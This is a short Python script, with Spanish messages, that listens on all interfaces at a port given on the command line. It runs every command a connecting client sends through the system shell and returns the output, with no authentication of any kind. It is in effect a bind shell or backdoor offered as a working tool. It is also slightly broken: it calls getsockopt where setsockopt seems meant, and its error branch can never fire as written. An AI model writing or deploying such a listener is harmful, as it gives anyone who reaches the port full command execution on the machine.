import socket as s
import sys, subprocess, os, threading, time

servidor = s.socket(s.AF_INET, s.SOCK_STREAM)
servidor.getsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)

HOST = "0.0.0.0"
PORT = int(sys.argv[1])
SEPARATOR = "<sep>"

servidor.bind((HOST, PORT))

print("[+] SERVIDOR INICIADO!")

servidor.listen()

def consultas(directorio, socketCliente):
    socketCliente.send(directorio.encode())
    while True:
        comando = socketCliente.recv(1024).decode()
        if comando.lower() == "exit":
            print("\n[+]CONEXION FINALIZADA DE {}:{}".format(addr[0], addr[1]))
            break
        else:
            try:
                output = subprocess.getoutput(comando)
                rta = f"OK\n{output}{SEPARATOR}{directorio}"
            except subprocess.CalledProcessError as error:
                rta = f"ERROR\n{output}{SEPARATOR}{directorio}"
            socketCliente.send(rta.encode())
    socketCliente.close()


while True:
    socketCliente, addr = servidor.accept()
    print("[+] CONEXION ESTABLECIDA DE {}:{}".format(addr[0], addr[1]))
    directorio = os.getcwd()
    #msj = "[+] CONEXION ESTABLECIDA CON EL SERVIDOR!"
    #socketCliente.send(msj.encode())
    time.sleep(1)
    hilo = threading.Thread(target=consultas, args=(directorio, socketCliente,  ))
    hilo.start()